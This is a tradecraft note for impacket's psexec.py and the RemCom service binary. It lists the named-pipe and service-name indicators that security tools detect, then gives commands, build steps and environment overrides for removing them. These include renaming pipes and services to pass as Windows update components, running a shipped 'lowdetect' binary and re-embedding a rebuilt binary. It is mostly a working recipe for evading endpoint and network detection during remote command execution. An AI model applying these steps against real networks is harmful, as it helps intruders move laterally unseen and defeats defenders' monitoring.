# psexec.py / RemCom — static IOCs and how to neutralise them

`examples/psexec.py` drops and runs a service binary (`RemComSvc`, from
[kavika13/RemCom](https://github.com/kavika13/RemCom)) and talks to it over named
pipes. The default build carries several **static, signatured indicators**. This
note enumerates them and documents the two evasion paths: what is configurable at
runtime today, and the recompile-and-re-embed workflow required to remove the
indicators that are baked into the compiled blob.

> Scope: this is a tradecraft reference, not a code change. The embedded
> `RemComSvc` binary cannot be altered from Python — the renamed-binary path
> below has to be built on a Windows/MSVC toolchain.

## The static indicators

| Indicator | Location | Configurable today? |
|---|---|---|
| Service name `RemComSvc` | embedded `REMCOMSVC` blob (`impacket/examples/remcomsvc.py`) + `-service-name` default `''` (random) | partly — `-service-name` renames the *installed* service, but the name inside the compiled binary is unchanged |
| Comms pipe `\RemCom_communicaton` *(sic — original RemCom typo)* | embedded `REMCOMSVC` blob | no — compiled in |
| Comms/I/O pipe names on the **client** side | `examples/psexec.py` constants `RemComCOMM` / `RemComSTDOUT` / `RemComSTDIN` / `RemComSTDERR` | **yes** — now env-overridable via `IMPACKET_REMCOM_PIPE` / `_STDOUT` / `_STDIN` / `_STDERR`, defaulting to the stock names |
| Comms/I/O pipe names on the **server** side | compiled into the service binary | only by rebuilding — both sides must match, so override the client constants to suit (see Path B) |
| Dropped binary name | `-remote-binary-name` (default randomised) | yes |

`RemComSTDOUT/STDIN/STDERR` and the service/pipe names are exactly what host- and
network-based rules key on. Renaming the service alone (`-service-name`) leaves the
pipe names and the in-binary strings intact, so it is **not** sufficient on its own.
The client pipe names are now configurable (see below); the names baked into the
service binary still require a rebuild, and the two **must** match.

## Path A — runtime flags (no rebuild)

Uses the stock embedded binary; reduces but does **not** remove the RemCom pipe IOCs.

```bash
psexec.py -service-name UpdateOrchestrator \
          -remote-binary-name wuauserv_helper.exe \
          DOMAIN/user@host
```

- `-service-name` — installed-service display/registry name (default `''` → random).
- `-remote-binary-name` — name of the binary written to the target share.

Good for cheap wins; leaves `\RemCom_communicaton` and `RemCom_std*` on the wire/host.

## Path B — custom service binary via `-file` (full removal)

`psexec.py -file <binary>` swaps the embedded `RemComSvc` for a binary you supply,
bypassing the blob entirely. To fully remove the IOCs you pair a rebuilt RemCom
(renamed pipes/service) with the matching `IMPACKET_REMCOM_*` client overrides,
because the two sides negotiate over those exact pipe names.

A ready-made renamed binary ships in this repo:
**`tools/remcom-lowdetect/RemComSvc-lowdetect.exe`** (see its README for the exact
name-set and build provenance). Use it directly, or rebuild your own per below.

### 1. Rebuild RemComSvc with renamed pipes/service (Windows + MSVC)

```
git clone https://github.com/kavika13/RemCom
```

Every indicator string lives in **`RemCom.h`**; rename the values there (keep
lengths sane, pick plausible names). At minimum:

- `RemCom_communicaton`  → e.g. `MsUpdate_ctl`
- `RemCom_stdout` / `_stdin` / `_stderr` → e.g. `MsUpdate_out` / `_in` / `_err`
- service name `RemComSvc` → e.g. `UpdateHealthSvc`

Build the **RemComSvc** project (`Release|Win32`, static CRT `/MT` — no VC runtime
dependency, as the `-file` help note warns). You now have a renamed service exe.
The shipped `RemComSvc-lowdetect.exe` was built exactly this way.

### 2. Point the client pipe constants at your binary — no code edit

`examples/psexec.py` reads the pipe names from env vars (defaults = stock RemCom
names). Set them to match the names compiled into your binary:

```bash
export IMPACKET_REMCOM_PIPE=MsUpdate_ctl     # control pipe  (RemComCOMM)
export IMPACKET_REMCOM_STDOUT=MsUpdate_out
export IMPACKET_REMCOM_STDIN=MsUpdate_in
export IMPACKET_REMCOM_STDERR=MsUpdate_err
```

These **must** equal the names compiled into your binary or the client will hang on
`openPipe`.

### 3. Run with your binary

```bash
psexec.py -file tools/remcom-lowdetect/RemComSvc-lowdetect.exe \
          -service-name UpdateHealthSvc \
          -remote-binary-name uhsvc.exe \
          DOMAIN/user@host
```

### (Optional) re-embed instead of shipping a file

If you prefer the single-file `-file`-less workflow, hex-encode your rebuilt binary
and replace the `REMCOMSVC` byte literal in `impacket/examples/remcomsvc.py`:

```python
data = open("UpdateHealthSvc.exe", "rb").read()
print("".join(f"\\x{b:02x}" for b in data))   # or build the b'...' lines
```

Re-embedding bakes your renamed binary in as the new default; still requires the
client-side env overrides from step 2. This repo intentionally leaves the embedded
blob stock so default behaviour is unchanged — the renamed binary is opt-in via
`-file`.

## Verification

- Static (no target): `psexec.py -h` parses; `-file`/`-service-name`/`-remote-binary-name`
  accepted; `IMPACKET_REMCOM_*` overrides feed `RemComCOMM/STDOUT/STDIN/STDERR` and
  match the rebuilt binary's compiled-in names.
- Runtime: execute against a lab host and confirm with Sysmon (pipe-create / service-install
  events) that no `RemCom*` strings appear, plus a network capture of the pipe traffic.
  Needs a Windows target — out of scope for static review.
